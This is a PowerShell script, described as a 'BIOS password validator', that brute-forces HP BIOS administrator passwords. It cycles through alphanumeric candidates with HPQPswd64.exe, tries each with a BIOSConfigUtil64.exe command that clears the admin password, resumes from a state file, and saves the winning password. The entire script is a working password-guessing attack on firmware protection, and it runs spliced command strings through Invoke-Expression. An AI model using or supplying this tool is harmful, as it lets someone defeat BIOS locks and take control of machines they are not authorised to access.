<#
.SYNOPSIS
    Brute-force BIOS password validator.

.DESCRIPTION
    Iterates through password combinations and validates them using the HP tooling pair
    described in the spec. The two tools form a matched pair and neither is disposable:

      1. HPQPswd64.exe writes each candidate password to a password file.
      2. BIOSConfigUtil64.exe verifies that file (it cannot work without the file HPQPswd64.exe produced).

    Supports resumable runs via a state file.

.PARAMETER CharSet
    The set of characters to use for password generation.
.PARAMETER MinLength
    Minimum password length.
.PARAMETER MaxLength
    Maximum password length.
.PARAMETER WriteCommand
    Step 1: the command that writes the candidate to the password file. Keep the PASSWORD
    placeholder; it is replaced with each candidate. Defaults to the spec's HPQPswd64.exe form:
    'HPQPswd64.exe /s /p"PASSWORD" /fpass'.
.PARAMETER VerifyCommand
    Step 2: the command that verifies the password file produced in step 1. It reads the file
    written by HPQPswd64.exe, so it has no PASSWORD placeholder. Defaults to the spec's
    BIOSConfigUtil64.exe form: 'BIOSConfigUtil64.exe /setvalue:"Admin Password Present","No" /cspassfile:pass'.
.PARAMETER RefusingString
    The string that indicates the verification (step 2) rejected the password. Success is when
    step 1 wrote the file without error and step 2's output does NOT contain this string.
.PARAMETER StateFile
    The path to the file used to store the last attempted password for resumability.
#>

param (
    [Parameter(Mandatory=$false)]
    [string]$CharSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",

    [Parameter(Mandatory=$false)]
    [int]$MinLength = 4,

    [Parameter(Mandatory=$false)]
    [int]$MaxLength = 8,

    [Parameter(Mandatory=$false)]
    [string]$WriteCommand = 'HPQPswd64.exe /s /p"PASSWORD" /fpass',

    [Parameter(Mandatory=$false)]
    [string]$VerifyCommand = 'BIOSConfigUtil64.exe /setvalue:"Admin Password Present","No" /cspassfile:pass',

    [Parameter(Mandatory=$false)]
    [string]$RefusingString = "Invalid password",

    [Parameter(Mandatory=$false)]
    [string]$StateFile = ".bios_brute_state"
)

# --- Internal Helpers ---

function Get-NextPassword {
    param (
        [string]$CurrentPassword,
        [string]$Charset,
        [int]$TargetLength
    )

    $chars = $Charset.ToCharArray()
    $len = $CurrentPassword.Length
    if ($len -eq 0) {
        return $chars[0]
    }

    $pwdArr = $CurrentPassword.ToCharArray()

    # Find the last character that can be incremented
    $idx = $len - 1
    while ($idx -ge 0) {
        $currentCh = $pwdArr[$idx]
        $charIdx = [array]::IndexOf($chars, $currentCh)
        if ($charIdx -lt $chars.Length - 1) {
            $pwdArr[$idx] = $chars[$charIdx + 1]
            # Reset subsequent characters
            for ($i = $idx + 1; $i -lt $len; $i++) {
                $pwdArr[$i] = $chars[0]
            }
            return -join $pwdArr
        }
        $idx--
    }

    return $null # Exhausted this length
}

# Runs a command via Invoke-Expression and returns @(<ErrorRecord>...). Empty => no error.
function Get-CommandError {
    param([string]$Cmd)
    return @(Invoke-Expression $Cmd 2>&1 | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] })
}

# --- Main Logic ---

# 1. Load State
$lastTried = ""
if (Test-Path $StateFile) {
    $lastTried = (Get-Content $StateFile -Raw).Trim()
    Write-Host "[*] Resuming from last state: '$lastTried'" -ForegroundColor Cyan
}

# 2. Iterate Lengths
for ($len = $MinLength; $len -le $MaxLength; $len++) {
    Write-Host "[*] Testing length: $len" -ForegroundColor Gray

    $attempt = ""

    # Handle Resumption Logic
    if ($lastTried.Length -eq $len) {
        # We need to start testing from the password AFTER $lastTried
        $attempt = Get-NextPassword -CurrentPassword $lastTried -Charset $CharSet -TargetLength $len
        if ($null -eq $attempt) {
            # Already finished this length in a previous run
            continue
        }
    } elseif ($lastTried.Length -gt $len) {
        # lastTried belongs to a later length, so this length is already done
        continue
    } else {
        # Start from the first possible for this length
        $chars = $CharSet.ToCharArray()
        $attempt = -join (& { for ($i=1; $i -le $len; $i++) { $chars[0] })
    }

    while ($attempt -ne $null -and $attempt -ne "") {
        $pwd = $attempt

        # Update state BEFORE attempting to ensure progress is recorded
        $pwd | Out-File $StateFile -Encoding utf8

        Write-Host "[>] Trying: $pwd" -NoNewline

        # Step 1: HPQPswd64.exe writes the candidate to the password file.
        # Use .Replace() (literal) so password characters are not treated as regex.
        $writeCmd = $WriteCommand.Replace('PASSWORD', $pwd)
        $writeErr = Get-CommandError -Cmd $writeCmd

        # Step 2: BIOSConfigUtil64.exe verifies the file produced in step 1.
        $verifyOut = (Invoke-Expression $VerifyCommand 2>&1) | Out-String

        # Success requires both steps: the file was written and verification did not refuse it.
        if ($writeErr.Count -eq 0 -and -not ($verifyOut -match $RefusingString)) {
            Write-Host " [OK]" -ForegroundColor Green
            Write-Host "`n[!] SUCCESSFUL PASSWORD FOUND: $pwd" -ForegroundColor Green -BackgroundColor Black
            Write-Host "----------------------------------------"
            Write-Host "  Step 1 (write):  $writeCmd"
            Write-Host "  Step 2 (verify): $VerifyCommand"
            $pwd | Out-File "successful_password.txt"
            if (Test-Path $StateFile) { Remove-Item $StateFile -ErrorAction SilentlyContinue }
            exit 0
        } else {
            $reason = if ($writeErr.Count -gt 0) { "write error" } else { "rejected" }
            Write-Host " [X] ($reason)" -ForegroundColor Red
        }

        # Move to next combination
        $attempt = Get-NextPassword -CurrentPassword $pwd -Charset $CharSet -TargetLength $len
    }
}

Write-Host "`n[i] Exhausted all combinations without success." -ForegroundColor Yellow
